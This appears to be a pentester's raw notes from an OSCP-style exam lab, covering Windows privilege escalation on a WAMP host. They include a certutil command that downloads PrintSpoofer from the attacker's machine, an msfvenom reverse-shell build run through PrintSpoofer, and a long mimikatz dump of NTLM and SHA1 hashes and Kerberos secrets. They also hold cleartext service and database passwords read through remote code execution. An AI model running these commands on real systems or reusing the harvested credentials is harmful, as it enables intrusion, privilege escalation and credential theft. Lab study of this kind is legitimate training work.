  141 find celia, get into 142, 142 find old, old get sam and system, get tom_admin. 

The `SeImpersonatePrivilege` privilege allows a process to impersonate a client after authentication. This can be exploited for privilege escalation using tools like PrintSpoofer. Here's a detailed explanation:

### **SeImpersonatePrivilege**

- **Purpose**: Allows a process to impersonate another user's security context.
- **Usage**: Commonly used in scenarios where a service needs to perform actions on behalf of a user.

### **PrintSpoofer Exploit**

PrintSpoofer is a tool that exploits the `SeImpersonatePrivilege` to escalate privileges. Here's how it works:

1. **Impersonation Tokens**: When a service with `SeImpersonatePrivilege` interacts with a client, it can obtain an impersonation token.
2. **Named Pipe**: PrintSpoofer creates a named pipe and tricks a privileged service (like the Print Spooler service) into connecting to it.
3. **Token Duplication**: Once the connection is established, PrintSpoofer duplicates the token of the privileged service.
4. **Privilege Escalation**: The duplicated token is then used to create a new process with elevated privileges.

```SQL
certutil -urlcache -split -f http:n45.203:8000/PrintSpoofer64.exe C:\wamp64\attendance\images\PrintSpoofer64.exe
-urlcache: Specifies that the URL should be cached.
-split: Splits the file into multiple parts if necessary.
-f: Forces the download.
```

  

  

.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08  
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)

## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

## \ / ## > [https://blog.gentilkiwi.com/mimikatz](https://blog.gentilkiwi.com/mimikatz)

'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )  
'#####' > [https://pingcastle.com](https://pingcastle.com/) / [https://mysmartlogon.com](https://mysmartlogon.com/) ***/

mimikatz # privilege::debug  
Privilege '20' OK

mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 247563 (00000000:0003c70b)  
Session : Interactive from 1  
User Name : celia.almeda  
Domain : OSCP  
Logon Server : DC01  
Logon Time : 6/12/2024 3:55:31 AM  
SID : S-1-5-21-2610934713-1581164095-2706428072-1105  
msv :  
[00000003] Primary==* Username : celia.almeda  
==* Domain : OSCP==* NTLM : e728ecbadfb02f51ce8eed753f3ff3fd  
==* SHA1 : 8cb61017910862af238631bf7aaae38df64998cd  
* DPAPI : f3ad0317c20e905dd62889dd51e7c52f  
tspkg :  
wdigest :  
* Username : celia.almeda  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : celia.almeda  
* Domain : OSCP.EXAM  
* Password : (null)  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 115947 (00000000:0001c4eb)  
Session : Service from 0  
User Name : Mary.Williams  
Domain : MS01  
Logon Server : MS01  
Logon Time : 6/12/2024 3:55:19 AM  
SID : S-1-5-21-2114389728-3978811169-1968162427-1002  
msv :  
[00000003] Primary  
* Username : Mary.Williams  
* Domain : MS01==* NTLM : 9a3121977ee93af56ebd0ef4f527a35e  
==* SHA1 : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5  
tspkg :  
wdigest :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
kerberos :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 115779 (00000000:0001c443)  
Session : Service from 0  
User Name : Mary.Williams  
Domain : MS01  
Logon Server : MS01  
Logon Time : 6/12/2024 3:55:19 AM  
SID : S-1-5-21-2114389728-3978811169-1968162427-1002  
msv :  
[00000003] Primary  
* Username : Mary.Williams  
* Domain : MS01  
* NTLM : 9a3121977ee93af56ebd0ef4f527a35e  
* SHA1 : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5  
tspkg :  
wdigest :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
kerberos :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 115051 (00000000:0001c16b)  
Session : Service from 0  
User Name : Mary.Williams  
Domain : MS01  
Logon Server : MS01  
Logon Time : 6/12/2024 3:55:19 AM  
SID : S-1-5-21-2114389728-3978811169-1968162427-1002  
msv :  
[00000003] Primary  
* Username : Mary.Williams  
* Domain : MS01  
* NTLM : 9a3121977ee93af56ebd0ef4f527a35e  
* SHA1 : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5  
tspkg :  
wdigest :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
kerberos :  
* Username : Mary.Williams  
* Domain : MS01  
* Password : (null)  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)  
Session : Service from 0  
User Name : LOCAL SERVICE  
Domain : NT AUTHORITY  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:16 AM  
SID : S-1-5-19  
msv :  
tspkg :  
wdigest :  
* Username : (null)  
* Domain : (null)  
* Password : (null)  
kerberos :  
* Username : (null)  
* Domain : (null)  
* Password : (null)  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 65466 (00000000:0000ffba)  
Session : Interactive from 1  
User Name : DWM-1  
Domain : Window Manager  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:16 AM  
SID : S-1-5-90-0-1  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP==* NTLM : 4a2333a738981569a6d25c7b60906502  
==* SHA1 : 4d615b523fe14e41d37e3fb47f280f5168874c1a  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : MS01$  
* Domain : oscp.exam  
* Password : 02 dd 07 58 3a 4c 74 11 d8 3a 00 7f 8d 31 f7 b8 4e 97 5d 90 78 3e bc e2 0c 7e 7e 25 06 22 49 5e 71 b1 78  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 65337 (00000000:0000ff39)  
Session : Interactive from 1  
User Name : DWM-1  
Domain : Window Manager  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:16 AM  
SID : S-1-5-90-0-1  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP==* NTLM : 18004222af81a9b7790bccbb8975cf97  
==* SHA1 : f7ba6bb013dbc664db3716cd326594bdfc3f7f72  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : MS01$  
* Domain : oscp.exam  
* Password : 2a 0d 35 f2 d7 58 85 c0 09 ee db a5 3c a0 a2 9e d9 93 f6 22 a9 53 7c ea b1 12 cb 0f 4e 84 9d 45 fd 70 c5  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)  
Session : Service from 0  
User Name : MS01$  
Domain : OSCP  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:14 AM  
SID : S-1-5-20  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP  
* NTLM : 18004222af81a9b7790bccbb8975cf97  
* SHA1 : f7ba6bb013dbc664db3716cd326594bdfc3f7f72  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : ms01$  
* Domain : OSCP.EXAM  
* Password : 2a 0d 35 f2 d7 58 85 c0 09 ee db a5 3c a0 a2 9e d9 93 f6 22 a9 53 7c ea b1 12 cb 0f 4e 84 9d 45 fd 70 c5  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 42393 (00000000:0000a599)  
Session : Interactive from 1  
User Name : UMFD-1  
Domain : Font Driver Host  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:14 AM  
SID : S-1-5-96-0-1  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP  
* NTLM : 18004222af81a9b7790bccbb8975cf97  
* SHA1 : f7ba6bb013dbc664db3716cd326594bdfc3f7f72  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : MS01$  
* Domain : oscp.exam  
* Password : 2a 0d 35 f2 d7 58 85 c0 09 ee db a5 3c a0 a2 9e d9 93 f6 22 a9 53 7c ea b1 12 cb 0f 4e 84 9d 45 fd 70 c5  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 42345 (00000000:0000a569)  
Session : Interactive from 0  
User Name : UMFD-0  
Domain : Font Driver Host  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:14 AM  
SID : S-1-5-96-0-0  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP  
* NTLM : 18004222af81a9b7790bccbb8975cf97  
* SHA1 : f7ba6bb013dbc664db3716cd326594bdfc3f7f72  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : MS01$  
* Domain : oscp.exam  
* Password : 2a 0d 35 f2 d7 58 85 c0 09 ee db a5 3c a0 a2 9e d9 93 f6 22 a9 53 7c ea b1 12 cb 0f 4e 84 9d 45 fd 70 c5  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 40101 (00000000:00009ca5)  
Session : UndefinedLogonType from 0  
User Name : (null)  
Domain : (null)  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:14 AM  
SID :  
msv :  
[00000003] Primary  
* Username : MS01$  
* Domain : OSCP  
* NTLM : 18004222af81a9b7790bccbb8975cf97  
* SHA1 : f7ba6bb013dbc664db3716cd326594bdfc3f7f72  
tspkg :  
wdigest :  
kerberos :  
ssp :  
credman :  
cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)  
Session : UndefinedLogonType from 0  
User Name : MS01$  
Domain : OSCP  
Logon Server : (null)  
Logon Time : 6/12/2024 3:55:14 AM  
SID : S-1-5-18  
msv :  
tspkg :  
wdigest :  
* Username : MS01$  
* Domain : OSCP  
* Password : (null)  
kerberos :  
* Username : ms01$  
* Domain : OSCP.EXAM  
* Password : 2a 0d 35 f2 d7 58 85 c0 09 ee db a5 3c a0 a2 9e d9 93 f6 22 a9 53 7c ea b1 12 cb 0f 4e 84 9d 45 fd 70 c5 26 12 ec 2d 17 13 30 c3 b7 71 e9 fe a0 db db f2 d6 d4 2b 8d cd 32 f2 b8 91 b8 34 1c 17 07 f2 9a 57 4d 22 5e b4 7e 6e e6 d2 0b 42 40 03 59 ac 04 8d 9a 96 94 50 94 d3 61 7e dd b8 e0 a1 54 3c 4a 8e 99 44 47 13 d5 98 78 8f 3b 90 da 91 f3 f0 a3 c7 e4 70 79 d9 3c 35 4b 89 df 3c da cf 94 fb 06 c7 65 3c 98 2b bf cd f2 fc 9c 4d 64 c1 a4 24 47 5f 07 56 ce 53 9e b0 e7 a8 f8 f3 bb 09 14 c1 df 74 3f 6f 8f 92 5a 0b 5d d0 27 fb 80 06 1c 1a e2 26 a9 db 21 9c 98 56 5a 00 94 1c 4b b3 39 90 b2 0f 34 bb 88 45 0f 4e bc 5b c0 74 5a 05 99 e0 48 91 fc 7e 9b 21 90 45 43 02 d0 36 eb e0 f2 dd 76 6e 61 d4 3e 9a 98 a4 b7 32 12 57 4f 4f  
ssp :  
credman :  
cloudap :

  

mimikatz #

Secret : _SC_wampapache64 / service 'wampapache64' with username : .\Mary.Williams  
cur/text: 69jHwjGN2bPQFvJ

Secret : _SC_wampmariadb64 / service 'wampmariadb64' with username : .\Mary.Williams  
cur/text: 69jHwjGN2bPQFvJ

Secret : _SC_wampmysqld64 / service 'wampmysqld64' with username : .\Mary.Williams  
cur/text: 69jHwjGN2bPQFvJ

  

  

RCE > type C:\wamp64\attendance\admin\includes\conn.php  
<?php  
$conn = new mysqli('localhost', 'root', 'TreeFlaskDomestic505', 'apsystem');

```Plain
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
```

?>  
RCE >

**WAMP64** refers to a **Windows**-based software stack that stands for **Windows, Apache, MySQL, PHP** (WAMP). It's a package that bundles Apache (a web server), MySQL (a database), and PHP (a server-side scripting language) together, allowing you to set up a web development environment on a **64-bit** Windows machine.

  

  

```SQL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe -o reverse3.exe
PrintSpoofer64.exe -i -c reverse3.exe
-i: Runs the command in interactive mode.
-c reverse3.exe: Specifies reverse3.exe as the command to run with elevated privileges.
```